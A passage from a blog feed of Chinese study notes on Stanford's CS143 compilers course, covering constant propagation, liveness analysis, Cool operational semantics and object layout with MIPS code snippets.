delete</strong></p><p>删除不可达代码，减小代码体积</p><p>Eg:不可能走的条件分支语句；导入了一个包里所有的工具，但是有没有用(有点类似treeshaking)</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050404.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>代数优化后：</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050407.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拷贝传播后：</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050410.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>常数折叠：</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050411.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>公共子表达式删除：</p><p>最终：</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week7%20P2/2021050416.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="peephole-optimization">Peephole Optimization</h2><h2 id="全局优化">全局优化</h2><p>为了在基本块之间用常数k代替变量x，编译器必须知道每条使用变量x路径的最后一个关于x的赋值语句<code>x := k</code>～～</p><p>对于全局优化，全局常量传播应该在～～处执行</p><p>所以全局优化的目标就是找到所有的～～</p><p>定义如下形式化符号：</p><table><thead><tr class="header"><th>value</th><th></th></tr></thead><tbody><tr class="odd"><td>$ $</td><td>This statement never executes（还没执行，一般用于初始化）</td></tr><tr class="even"><td>$ C $</td><td>X = C (C is constant)</td></tr><tr class="odd"><td>$$</td><td>X is not a constant（已执行，但是不确定具体值）</td></tr></tbody></table><p><strong>常数拷贝：</strong>常数拷贝是很有用的因为它可以使得一些变量直接转换成常量，从而减少寄存器的使用，但是在控制图里，判断一个变量是否可以被替换成常量是困难的</p><p>一种思路是一个变量的信息和它的上下文有关（前后语句） <spanclass="math display">\[C(s, x, in) = value \quad of \quad x \quad before \quad s  \quad在语句s之前变量x的信息\]</span></p><p><span class="math display">\[C(s, x, out) = value \quad of \quad x \quad after \quad s \quad在语句s之后变量x的信息\]</span></p><p>由于课本上的规则过于复杂，本人总结了以下规则rules：</p><ul><li>针对某个节点的入度，有以下几种情况：<ol type="1"><li>如果其入度节点其中有一个是T，则该节点信息为T</li><li>如果其入度节点存在常量，但是均不相等，则该节点信息为T</li><li>如果其入度节点存在节点固定为某个常量，且其入度节点不为T，则该节点也为该常量</li><li>如果其入度节点均为unknown，则该节点为unknown</li></ol></li><li>针对某个节点的出度，<ol start="5" type="1"><li><p>入度为unknown，则出度也为unknown</p></li><li><p>在s语句赋值为某个常量，则出度为该常量</p></li><li><p>在s语句赋值为某个非常量表达式，则出度为T</p></li><li><p>s语句如果没有对入度节点做任何更改，则出度=入度</p></li></ol></li></ul><p><strong>伪代码描述常量传播：</strong></p><blockquote><p>For every entry s to the program,，set C(s, x, in) = <spanclass="math inline">\(\top\)</span> set C(s, x, in) = C(s, x, out) =<span class="math display">\[\perp\]</span> everywhere else repeat utilall points satisfy 1-8： Pick s not satisfying 1-8 and update using theappropriate rule</p></blockquote><p><strong>为什么要引入$ $？</strong></p><p>由于循环，循环的每个点都需要值存在</p><p>直觉上，分配一些初始值去打破循环</p><p>$ $表示直到目前为止，控制流程还没有到达当前点；</p><p><spanclass="math inline">\(\top\)</span>事一种抽象值，因为不知道运行的时候具体的值，</p><p>C之间是不可比较的</p><p><span class="math inline">\(\top\)</span>是最大的，$ $是最小的</p><p><strong>符号形式化：</strong></p><p>对是$ ,, C$进行排序： <span class="math display">\[\perp &lt; C &lt; \top\]</span> 可以形象化如下：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520134741534.png"alt="image-20230520134741534" /><figcaption aria-hidden="true">image-20230520134741534</figcaption></figure><p>定义 <code>lub</code> 运算： 在这个层级规则下的最小上界</p><p><code>lub(x, y, z, ..)</code>：大于等于x,y,z,...的最小值</p><p>部分可以写作：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">C(<span class="hljs-params">s</span>, <span class="hljs-params">x</span>, <span class="hljs-params">in</span>)</span> = lub &#123; <span class="hljs-constructor">C(<span class="hljs-params">p</span>, <span class="hljs-params">x</span>, <span class="hljs-params">out</span>)</span> <span class="hljs-pattern-match">| p is a predecessor <span class="hljs-keyword">of</span> s &#125;</span><br><span class="hljs-pattern-match"></span><br></code></pre></td></tr></table></figure><p>🌰：</p><p><code>Lub(到, 1) = 1</code></p><p><code>Lub(T, 1) = 1</code></p><p><code>Lub(1, 2) = T</code></p><p>之前简单的说一直重复直到没什么东西发生变化才停止是不准确，不规范的；</p><p>正式描述应该使用lub，lub为什么是正确的？</p><ul><li>values start as 到 and only increase</li><li>$ $ can change to a constant, and a constant to <spanclass="math inline">\(\top\)</span></li><li>Thus, <code>C(s, x, _)</code> can change at most twice</li></ul><p>常量拷贝算法是的时间复杂度和程序大小成正比</p><blockquote><p>Number of steps =</p><p>Number of C(...) values computed * 2 =✖️2是因为每个语句的最多算两次</p><p>Number of program statements * 4 ✖️2是因为每个语句的in and out</p></blockquote><p><strong>变量生存分析：</strong></p><p>从程序退出节点开始分析，向上回溯节点，</p><ol type="1"><li>如果当前节点包含出度的活跃变量的赋值语句，则当前节点的入度，就不会在有这个活跃变量(因为重新赋值了，之前的相当于是deadcode，可以被视为dead variable)；</li><li>如果当前节点的rfs（右表达式）包含某个变量，则这些变量是活跃变量；</li></ol><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week8%20P2/2021050601.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">有两个exit节点，initNode = </span><span class="hljs-template-variable">&#123; a, b &#125;</span><span class="language-xml">, lives = </span><span class="hljs-template-variable">&#123; b &#125;</span><span class="language-xml">，开始自底向上分析</span><br><span class="language-xml"></span><br><span class="language-xml">b = f + c 使用了f和c，产生了b，根据规则2，入度里f和c是活跃变量，根据规则1入度里b不是活跃变量 </span><span class="hljs-template-variable">&#123;f, c&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">f = 2 * e 使用了e，根据规则2，入度里e是活跃变量，f是新的赋值，根据规则1入度里f不是活跃变量，格局规则3，c的活跃不发生变化 </span><span class="hljs-template-variable">&#123;c, e&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">b = d + e，使用了d和e，根据规则2，d和e是活跃变量，而b被赋值了，c和f未出现1在左侧，所以</span><span class="hljs-template-variable">&#123;c,d,e,f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">e = e + 1, 使用了e，根据规则1，e是活跃变量，而c和f以及b都是其后续节点需要的，所以</span><span class="hljs-template-variable">&#123;b, c, e, f &#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">对于分支处，取并集得：</span><span class="hljs-template-variable">&#123;b, c, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">对于f = 2 * e的入度，f被重新赋值，而e是被用的，所以</span><span class="hljs-template-variable">&#123; c, e &#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">同理对于 b = d + e和e = e + 1的入度，其活跃变量已经计算过：</span><span class="hljs-template-variable">&#123;c, d, e, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">取并集的e = d + f的出度 </span><span class="hljs-template-variable">&#123;c, d, e, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">e = d + f的入度 =&gt; </span><span class="hljs-template-variable">&#123;c, d, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">d = -a 的入度 =&gt; </span><span class="hljs-template-variable">&#123;c, a, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">a = b + c的入度 =&gt; </span><span class="hljs-template-variable">&#123;f, c, b&#125;</span><br></code></pre></td></tr></table></figure><p><strong>总结：</strong></p><p>变量分析是自底向上，从程序的退出节点回溯的，因为程序退出的时候，可能希望某些变量依旧保存</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 6 Cool Operational semantics</title>
    <link href="/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AD/"/>
    <url>/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<p>本文是斯坦福cs143编译原理的笔记，内容大部分来自于课件和自己的理解，笔者能力和精力有限，如果有错误欢迎指出。</p><h2 id="引言">引言</h2><p>类比：</p><p>parser阶段，我们要给每种token设置对应的action</p><p>语法分析阶段，有一系列的文法式，要在每个文法式规约的时候设置action，规定对应的行为</p><p>类型分析阶段：对每一种表达式设置对应的语义动作，进行语义分析</p><p>同样的优化阶段：对每一种表达式设置对应的代码生成及优化动作。</p><p>如何形式化表示这些表达式对应动作（语义，我理解就是表达式的动作）</p><blockquote><p>Denotational semantics: 数学函数表示</p><p>Axiomatic semantics: 通过逻辑公式描述程序行</p><p>Operational sematics: 通过执行规则描述程序评估</p></blockquote><h2 id="操作语义">操作语义</h2><p>在类型推断和检查的时候，引进过这样一种符号： <spanclass="math display">\[Context \vdash e: C在给定大的上下文context里，表达式是类型C\]</span>同样的，评估阶段(代码生成阶段之前的准备工作)，也会用类似的符号： <spanclass="math display">\[Context \vdash e: v在给定大的上下文context里，表达式会被评估为值v\]</span> 🌰： <span class="math display">\[\frac{Context \vdash e1: 5 \quadContext \vdash e2: 7}{Context \vdash e1 + e2: 12}\]</span> &gt;在语境Context下e1被评估为5，e2被评估为7，那么e1+e2就是12，当然这种是常量比较简单哈，没什么用处，实际情况下有变量的情况下就复杂了；&gt;</p><p>考虑评估：y &lt;- x + 1</p><p>由于存在局部作用域，所以评估一个值，需要：</p><p>Environment: where in memory a variable is</p><p>Store: what is in the memory</p><p>简单来说就是两个映射表：</p><p>Enviroment：va r =&gt; loc</p><p>Store: loc =&gt; value</p><p>形式化表示：</p><p><span class="math display">\[E = [a: l1, b: l2] \quad 变量a在内存中的l1处，b在内存的l2处 \\S = [l1 =&gt; 5, l2 =&gt; 7] \quad l1处存储的值是5，l2处存储的值是7 \\S&#39; = S[l2/l1] \quad defines \quad a \quad store \quadS&#39;\quad  such \quad that \\ S&#39;(l1) = 12 \quad and\quad  S&#39;(l) = S(l) \quad  if \quad l \neq l1 \\简单理解下S&#39;就是S在l1处做了单点修改\]</span></p><h2 id="cool里的语义">cool里的语义</h2><p>cool里面值都是对象（cool是面向对象的语言）</p><p><code>X(a1 = l1, ..., an = ln)</code> 表示为一个cool 对象，其中</p><ul><li><p>X是类</p></li><li><p>ai是其属性，包含继承的属性</p></li><li><p>li是对应ai被存储的内存位置</p></li></ul><p><strong>cool内置类：</strong></p><ul><li>Int(5),</li><li>Bool(true)</li><li>String(4, "cool") the string "Cool" of length 4</li><li>特殊值：void，该对象上没有方法，如果调用isvoid将会抛出异常，cool里对void的具体实现时NULL（Cpp里的空指针，因为cool是用cpp实现的）</li></ul><p>考虑如下评估式： <span class="math display">\[{so, E, S \vdash e: v, S&#39;}\]</span> so(self object)， E 是当前的变量环境，S是当前Store；</p><p>e获得了评估结果后值是v，并且新的store是S‘</p><p>评估的结果实际是值v和新的Store，新的Store是有副作用(副作用是值引用修改，而不是copy)</p><p>但是在评估后有一些事不会改变的：</p><ul><li><p>变量环境</p></li><li><p>self</p></li><li><p>操作语义允许递归</p></li></ul><p>下面具体介绍了cool的一些操作语义评估，我就简单那几个比较经典的：</p><hr /><p><strong>变量使用</strong>：在E中找到id的位置，然后在S中找对应的值<span class="math display">\[\frac{E(id) = I_{id} \quadS(I_{id}) = v}{so, E, S \vdash id: v, S}\]</span> ------</p><p><strong>self:</strong> <span class="math display">\[{so, E, S \vdash self: so, S}\]</span> ------</p><p><strong>变量赋值：</strong>就是对id处做单点修改返回新的Store，id的评估结果就是e的评估结果v<span class="math display">\[\frac{so, E, S \vdash e: v, S_1 \quadE(id) = I_{id} \quadS_2 = S_1[v/id]}{so, E, S \vdash id=e: v, S2}\]</span> e1+e2：先递归对e1评估，评估后e1的值是v1，并产生新的StoreS1，接着对e2递归进行评估，评估后e2的值是v2，并产生新的StoreS2，最终e1+e2的评估结果就是值为v1 + v2，新的Store S2 <spanclass="math display">\[\frac{so, E, S \vdash e: v, S_1 \quadso, E, S1 \vdash e: v2, S_2}{so, E, S \vdash e1 + e2: v1 + v2, S2}\]</span> ------</p><p>🌰：{ X = 7 + 5; 4;}</p><p>先对一个表达式X=7+5评估 <span class="math display">\[{so, [X&lt;-1], [l&lt;-0] \vdash x=7+5: ?, ?}\]</span> 继续递归对7+5进行评估 <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 7+5: ?, ?}\]</span> 继续递归对7评估： <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 7: Int(7), [l&lt;-0]}\]</span> 同样的对5评估： <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 5: Int(5), [l&lt;-0]}\]</span></p><p>返回到上一层7+5: <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 7+5: Int(12), [l&lt;-0]}\]</span> 继续返回到上一层x=7+5：</p><p>这个时候已经处理完了7+5，继续处理x，这是声明变量，得到单点更新后的Store：<span class="math display">\[[l&lt;-0](12/l) =&gt; [l/12]\]</span> 这个时候子表达式都处理完了，继续处理最外层的第一个表达式 <spanclass="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash x=7+5: 12, [l&lt;-12]}\]</span> 继续处理同级别的表达式4 <span class="math display">\[{so, [X&lt;-l], [l&lt;-12] \vdash 4: Int(4), [l&lt;-12]}\]</span></p><p><span class="math display">\[\frac{...}{so, [X&lt;-1], [1&lt;-0] \vdash \{X=7+5;4;\}: Int(4),[1&lt;-12]}\]</span></p><hr /><p><strong>if-else</strong></p><p><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514173710435.png"alt="image-20230514173710435" /> <span class="math display">\[\frac{so, E, S \vdash e1: Bool(false), S1}{so, E, S \vdash while \quade1 \quad loop \quad e2 \quad pool: void, S1}\]</span> ------</p><p><strong>while</strong></p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514173719883.png"alt="image-20230514173719883" /><figcaption aria-hidden="true">image-20230514173719883</figcaption></figure><hr /><p><strong>声明变量：</strong> <span class="math display">\[\frac{so, E, S \vdash e1: v1, S1 \quad so, ?, ? \vdash v, S2}{so, E, S\vdash let \quad id: T = e1 \quad in \quad e2: v2, S2}\]</span> e2应该在什么环境下评估呢（问号处应该填什么呢）？</p><p>—仍然是E，但是E里应该新增映射<code>id =&gt; Inew</code>，表示为id新分配了一块内存，同样的Store应该是有新的映射<code>Inew =&gt; v1</code></p><p>新增符号：Inew =newloc(S)，表示Inew是一个新分配的内存，newloc可以理解为是一个内存分配函数<span class="math display">\[\frac{so, E, S \vdash e1: v1, S1 \quad I_{new} = newloc(S1) \quad  so,E[I{new}/id], S1[v1/I_{new}] \vdash v2, S2}{so, E, S \vdash let \quadid: T = e1 \quad in \quad e2: v2, S2}\]</span></p><hr /><p><strong>new对象的评估语义：</strong></p><ul><li><p>首先，为对象的所有参数分配内存（本质上就是分配对象）</p></li><li><p>为对象设置缺省值</p></li><li><p>评估对象的初始化语句，并重新设置属性值</p></li><li><p>返回被分配的对象</p></li></ul><p>每个对象都有默认值</p><ul><li><p>int： Int(0)</p></li><li><p>bool: Bool(false)</p></li><li><p>String: String(0, '')</p></li></ul><p>类A的形式化表示：</p><p><code>class(A) = (a1: T1 &lt;-e1, ..., an: Tn &lt;- en)</code>，其中：</p><ul><li><code>ai</code>是属性，包含继承属性</li><li><code>Ti</code>是属性的类型</li><li><code>ei</code>是初始化表达式</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514173910377.png"alt="image-20230514173910377" /><figcaption aria-hidden="true">image-20230514173910377</figcaption></figure><p>在评估初始化表达式阶段：</p><ul><li><p>self is the current object</p></li><li><p>only the attributes are in scope()，作用域内只有属性</p></li><li><p>属性的初始值都是默认值，主要是防止在初始化语句里面会用到这些初始值，比如:<code>Class A &#123; a &lt;- a &#125;</code>，用a初始化a，如果a没有默认值，可能会有异常；</p></li></ul><p>Informal semantics of class e0.f(e1, ..., en)：</p><ul><li><p>首先，依次评估参数e1, ..., en，</p></li><li><p>评估e0，获得e0的值</p></li><li><p>假设X是e0评估结果的动态类型</p></li><li><p>从dispatch table中获取f</p></li><li><p>为n个参数分配内存空间，更新Enviroment</p></li><li><p>为分配的空间初始化值</p></li><li><p>set selft to the target object and evaluate f's body</p></li></ul><p>For a class <code>A</code> and a method f of <code>A</code> (possibleinherited)</p><p><code>impl(A, f) = (X1, ..., Xn, ebody)</code>，其中：</p><ul><li><code>Xi</code>是形式参数</li><li><code>ebody</code>是方法体(函数体)</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514174645616.png"alt="image-20230514174645616" /><figcaption aria-hidden="true">image-20230514174645616</figcaption></figure><p><u>impl</u>有没有可能获取不到方法？不可能，因为类型检查以已经通过了，倘若没有类型检查，这一阶段会更复杂</p><p>当然也有一些runtime error类型检查检查不到：</p><ul><li>A dispathc on void</li><li>Division by zero</li><li>Substring out of range</li><li>Heap overflow</li></ul><p>这些异常情形下，编译器必须抛出错误，并中断，而不是崩溃(not with asegfault)</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 8 Cool Object Layout</title>
    <link href="/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AB/"/>
    <url>/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AB/</url>
    
    <content type="html"><![CDATA[<p>本文是斯坦福cs143编译原理的笔记，内容大部分来自于课件和自己的理解，笔者能力和精力有限，如果有错误欢迎指出</p><h2 id="temporaries">Temporaries</h2><p>之前介绍的汇编代码比如两个表达式相加：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">a0</span> (<span class="hljs-number">0</span>)$<span class="hljs-built_in">sp</span><br>li $<span class="hljs-built_in">t0</span> ?<br><span class="hljs-keyword">add </span>$<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">t0</span>, $<span class="hljs-built_in">a0</span><br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">s0</span> $<span class="hljs-built_in">sp</span><br></code></pre></td></tr></table></figure><p>这里把其中一个加数放在了stack里，然后取出来，再把计算的中间结果放在了stack里，这就是临时变量</p><p>最普通的<strong><code>堆栈机</code></strong>需要在函数栈帧暂存这些临时变量（虽然这并不高效，后面会讲解关于临时变量分配到寄存器的算法）</p><p>考虑下面代码使用了多少临时变量：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">def</span> fib(x) = <br><span class="hljs-attribute">if</span> (x == <span class="hljs-number">1</span>) ==&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">then</span> <span class="hljs-number">0</span> ==&gt; <span class="hljs-number">0</span><br><span class="hljs-attribute">else</span><br><span class="hljs-attribute">if</span> (x == <span class="hljs-number">2</span>) ==&gt; <span class="hljs-number">1</span><br><span class="hljs-attribute">then</span> <span class="hljs-number">1</span> ==&gt; <span class="hljs-number">0</span><br><span class="hljs-attribute">else</span><br><span class="hljs-attribute">fib</span>(x-<span class="hljs-number">1</span>) + fib(x-<span class="hljs-number">2</span>) ==&gt; x-<span class="hljs-number">1</span>是一个，x-<span class="hljs-number">2</span>是一个，两式相加，会产生一个，所以共两个<br><span class="hljs-attribute">fi</span><br><span class="hljs-attribute">fi</span><br></code></pre></td></tr></table></figure><p>定义NT(e)为表达式e需要多少个临时变量</p><p>对于一个函数定义：<code>f(x1, ..., fn) = e</code>，the AR has<code>2 + NT(e)</code> elements:</p><ul><li>Return</li><li>Frame pointer</li><li>n arguments</li><li>NT(e)</li></ul><p>以下是一些常见的规则：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">NT(<span class="hljs-params">e1</span> + <span class="hljs-params">e2</span>)</span> = <span class="hljs-constructor">Max(NT(<span class="hljs-params">e1</span>)</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e2</span>)</span> + <span class="hljs-number">1</span>)<br>Needs at least <span class="hljs-keyword">as</span> many tempories <span class="hljs-keyword">as</span> <span class="hljs-constructor">NT(<span class="hljs-params">e1</span>)</span><br>Needs at least <span class="hljs-keyword">as</span> many tempories <span class="hljs-keyword">as</span> <span class="hljs-constructor">NT(<span class="hljs-params">e2</span>)</span> + <span class="hljs-number">1</span><br>Of course, space used <span class="hljs-keyword">for</span> temporaies <span class="hljs-keyword">in</span> e1 can be reused <span class="hljs-keyword">for</span> temporaies <span class="hljs-keyword">in</span> e2<br><br><span class="hljs-constructor">NT(<span class="hljs-params">if</span> <span class="hljs-params">e1</span> = <span class="hljs-params">e2</span> <span class="hljs-params">then</span> <span class="hljs-params">e3</span> <span class="hljs-params">else</span> <span class="hljs-params">e4</span>)</span> = <span class="hljs-constructor">Max(NT(<span class="hljs-params">e1</span>)</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e2</span>)</span> + <span class="hljs-number">1</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e3</span>)</span>, <span class="hljs-constructor">NT(<span class="hljs-params">e4</span>)</span>)<br><span class="hljs-constructor">NT(<span class="hljs-params">id</span>(<span class="hljs-params">e1</span>, <span class="hljs-operator">...</span>, <span class="hljs-params">en</span>)</span> = <span class="hljs-constructor">Max(NT(<span class="hljs-params">e1</span>)</span>, ..., <span class="hljs-constructor">NT(<span class="hljs-params">en</span>)</span>)<br><span class="hljs-constructor">NT(<span class="hljs-params">int</span>)</span> = <span class="hljs-number">0</span><br><span class="hljs-constructor">NT(<span class="hljs-params">id</span>)</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>在没有使用临时变量之前：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cgen(e1 + e2) = <br>cgen(e1)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">a0</span> <span class="hljs-number">0</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">sp</span> $<span class="hljs-built_in">sp</span> - <span class="hljs-number">4</span><br>cgen(e2)<br><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">t1</span> <span class="hljs-number">4</span>($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">add </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">t1</span> $<span class="hljs-built_in">a0</span><br><span class="hljs-keyword">addiu </span>$<span class="hljs-built_in">a0</span> $<span class="hljs-built_in">sp</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>使用了临时变量之后：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">cgen(e1 + e2, nt) = <br>cgen(e1, nt)<br>sw <span class="hljs-variable">$a0</span> nt(<span class="hljs-variable">$fp</span>) <span class="hljs-regexp">//</span> 在偏移量处做压入栈的动作<br><span class="hljs-regexp">//</span> addiu <span class="hljs-variable">$sp</span> <span class="hljs-variable">$sp</span> - <span class="hljs-number">4</span> 这样就不用了频繁执行addiu了<br>cgen(e2, nt + <span class="hljs-number">4</span>)<br>lw <span class="hljs-variable">$t1</span> nt(<span class="hljs-variable">$fp</span>)<br>add <span class="hljs-variable">$a0</span> <span class="hljs-variable">$t1</span> <span class="hljs-variable">$a0</span><br>  <span class="hljs-regexp">//</span> addiu <span class="hljs-variable">$a0</span> <span class="hljs-variable">$sp</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><h2 id="object-layout-and-dynamic-dispatch">Object Layout and dynamicdispatch</h2><p>OO(Objetc Oriented) Implementation = Basic code generation + morestuff(面向对象的实现其实就是之前所介绍的基本代码生成+本次要讲的内容)</p><p>OO Slogan：如果B是A的子类，那么B类对象可以用于任何A类的地方：</p><p>eg:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> &#123;</span>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> <span class="hljs-title">extends</span> <span class="hljs-title">A</span> &#123;</span>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">f</span> <span class="hljs-params">(A a)</span> &#123;<br><br>&#125;<br><br>函数f的入参可以是A及其子类<br></code></pre></td></tr></table></figure><p>这就意味着在代码生成的时候，在已经生成完了A类的代码，那么B类(A的子类)可以不用修改其父类(A)的代码，而只是在其基础上进行扩展。</p><p>再介绍对象的代码生成之前，需要考虑以下问题：</p><p><code>对象在内存里如何表示？</code></p><ul><li><p>Objects are laid out int contiguous memory;</p></li><li><p>Each attribute stored at a fixed offset in the object;</p></li><li><p>The attribute is in the same place in every object of thatclass;</p></li><li><p>When a method is invoked, the object is self and the fields arethe object's attributes;</p></li></ul><blockquote><p>为什么对象每个属性都是固定的偏移量呢？这要归结于同一个类可以new多个对象，但这些对象的数据内存是各自独有的，每个对象同一个属性在固定偏移量的内存处，方便获取；而方法是共享的，所以方法单独维护在了一张methodstable中，每个对象都都持有指向这个methods table的指针dispatchpointer，不然不同的对象还要维护各自的方法，这样太费内存了。</p></blockquote><p><code>如何实现动态分配?</code></p><p>answer: Method table and dispatch ptr</p><p>关于动态分配和静态分配的概念：https://lukasatkinson.de/2016/dynamic-vs-static-dispatch/</p><p>其实node里也有静态分配和动态分配的概念：</p><p>wip</p><p><strong>首先介绍下对象布局</strong></p><p>考虑如下🌰，以下内容均围绕该🌰展开：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs css">class <span class="hljs-selector-tag">A</span> &#123;<br><span class="hljs-selector-tag">a</span>: Int &lt;- <span class="hljs-number">0</span>;<br>d: Int &lt;- <span class="hljs-number">1</span>;<br>f(): Int &#123; <span class="hljs-selector-tag">a</span>&lt;- <span class="hljs-selector-tag">a</span> + d &#125;;<br>&#125;<br><br>class <span class="hljs-selector-tag">B</span> &#123;<br> <span class="hljs-selector-tag">b</span>: Int &lt;- <span class="hljs-number">2</span>;<br> f(): Int &#123; <span class="hljs-selector-tag">a</span> &#125;;<br> g(): Int &#123; <span class="hljs-selector-tag">a</span> &lt;- 